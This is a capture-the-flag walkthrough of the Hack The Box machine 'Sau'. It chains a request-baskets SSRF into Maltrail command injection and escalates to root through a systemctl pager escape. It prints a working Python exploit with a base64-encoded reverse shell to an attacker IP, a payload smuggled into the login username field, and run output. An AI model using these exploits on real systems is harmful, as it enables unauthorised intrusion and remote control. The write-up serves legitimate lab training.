# Sau

Nmap

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 sau.htb 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-13 13:18 EDT
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
```

The port 80 is filtered, we can’t access it

On port 55555 there is the service request-baskets

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FvgrkJTEzEKDc6XokDmN5%2Fimage.png?alt=media&#x26;token=26992fbb-3faf-4fd1-9d64-c8f03d036c7a" alt=""><figcaption></figcaption></figure>

We look online for a version vulnerability ⇒ it is vulnerable to SSRF. That means, if the server running on port 80 is only accessible to [localhost](http://localhost), we should be able to access it nonetheless

We grab an exploit to fuzz for ports

```bash
import requests
import time
import random
import string

length = 8
basket = ''.join(random.choices(string.ascii_letters+string.digits,k=length))
print(f'Basket is {basket}\\r\\n')

IP_Vuln_Server = r'10.129.229.26:55555'
Basket_config_API = r'/api/baskets/'+basket
Basket_API = r'/'+basket

Server_URL = 'http://'+IP_Vuln_Server+Basket_config_API
Fetch_URL = 'http://'+IP_Vuln_Server+Basket_API

### Create a basket and fetch api token
def SetBasket_FetchAPIToken():
    resp = requests.post(Server_URL)
    data = resp.json()
    print('API Token: '+data['token']+'\\r\\n')
    return data['token']

### For following requests place API token
### Change the configuration
def ConfBasketAndFetchResp(headers,port):
    json_config = {
        "forward_url":f"<http://127.0.0.1>:{port}/",
        "proxy_response":True,
        "insecure_tls":False,
        "expand_path":True,
        "capacity":250
    }
    resp=requests.put(Server_URL, json=json_config, headers=headers)
    time.sleep(0.5)
    resp = requests.get(url=Fetch_URL)
    if resp.status_code == 200:
        print('Something is on <http://127.0.0.1>:'+str(port)+'\\r\\n'+resp.text+'\\r\\n-------------------------------')

def main():
    token = SetBasket_FetchAPIToken()
    headers = {
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Authorization':f'{token}'
    }

    for i in range(75,82):
        ConfBasketAndFetchResp(headers,i)

## Main 
if __name__ == '__main__':
    main()
```

We run the exploit and we get a response for port 80

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 PoC_27163.py
Basket is ujxNDKmo

API Token: nPfV7tAIfJTgDJV4TQ16VTOufuCQTZjRUWRj8Y_qWuJG

Something is on <http://127.0.0.1:80>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        <meta name="robots" content="noindex, nofollow">
        <title>Maltrail</title>
        <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/media.css">
        <script type="text/javascript" src="js/errorhandler.js"></script>
        <script type="text/javascript" src="js/thirdparty.min.js"></script>
        <script type="text/javascript" src="js/papaparse.min.js"></script>
    </head>
    <body>
        <div id="header_container" class="header noselect">
            <div id="logo_container">
                <span id="logo"><img src="images/mlogo.png" style="width: 25px">altrail</span>
            </div>
            <div id="calendar_container">
                <center><span id="spanToggleHeatmap" style="cursor: pointer"><a class="header-a header-period" id="period_label"></a><img src="images/calendar.png" style="width: 25px; height: 25px; vertical-align: top"></span></center>
            </div>
            <ul id="link_container">
                <li class="header-li"><a class="header-a" href="<https://github.com/stamparm/maltrail/blob/master/README.md>" id="documentation_link" target="_blank">Documentation</a></li>
                <li class="header-li link-splitter">|</li>
                <li class="header-li"><a class="header-a" href="<https://github.com/stamparm/maltrail/wiki>" id="wiki_link" target="_blank">Wiki</a></li>
```

We see another service being used ⇒ maltrail

This service is also vulnerable. We can RCE through SSRF

We grab the code

```bash
#!/usr/bin/env python3
import requests
import sys
import random
import string
import base64
import time

def ensure_http_schema(url):
    if not url.startswith(("http://", "https://")):
        return "http://" + url
    return url

def generate_basket_name(length=6):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def create_proxy_basket(server_url, forward_url):
    if not server_url.endswith("/"):
        server_url += "/"

    basket_name = generate_basket_name()
    api_url = f"{server_url}api/baskets/{basket_name}"

    payload = {
        "forward_url": forward_url,
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }

    print(f"[+] Creating proxy basket '{basket_name}' pointing to {forward_url}")
    r = requests.post(api_url, json=payload)
    if r.status_code not in [200, 201]:
        print(f"[!] Failed to create basket: {r.status_code} {r.text}")
        sys.exit(1)

    token = r.json().get("token")
    basket_url = f"{server_url}{basket_name}"
    print(f"[+] Basket created: {basket_url}")
    print(f"[+] Authorization Token: {token}")
    return basket_url

def send_reverse_shell(proxy_url, attacker_ip, attacker_port):
    print("[+] Encoding reverse shell payload...")

    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'"""
    b64_payload = base64.b64encode(payload.encode()).decode()

    injected_payload = f'`echo {b64_payload} | base64 -d | bash`'

    print("[+] Sending command injection via proxy to /login...")
    response = requests.post(f"{proxy_url}/login", data={"username": f";{injected_payload}"})

    if response.status_code in [200, 302]:
        print("[+] Exploit sent successfully! Check your listener.")
    else:
        print(f"[!] Exploit may have failed. HTTP {response.status_code}: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <attacker_port> <request_baskets_url>")
        print(f"Example: {sys.argv[0]} 10.10.10.10 8000 <http://10.129.229.26:55555>")
        sys.exit(1)

    attacker_ip = sys.argv[1]
    attacker_port = int(sys.argv[2])
    request_baskets_url = ensure_http_schema(sys.argv[3])
    proxy_target_url = "<http://127.0.0.1:80>"
    proxy_url = create_proxy_basket(request_baskets_url, proxy_target_url)
    time.sleep(3)
    send_reverse_shell(proxy_url, attacker_ip, attacker_port)
```

Run the exploit and get a shell

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 ssrf_to_rce_sau.py 10.10.16.2 4444 <http://10.10.11.224:55555>
[+] Creating proxy basket 'dzqqbe' pointing to <http://127.0.0.1:80>
[+] Basket created: <http://10.10.11.224:55555/dzqqbe>
[+] Authorization Token: MggNs_OCWIUCbflVX2LijpyRXrlIKTB4Qvh067FQ7Ca-
[+] Encoding reverse shell payload...
[+] Sending command injection via proxy to /login...
```

We try to escalate our privileges

```bash
puma@sau:/dev/shm$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

We are able to run systemctl status as root

```bash
/usr/bin/systemctl status trail.service

# When in the pager run : 
!sh
```
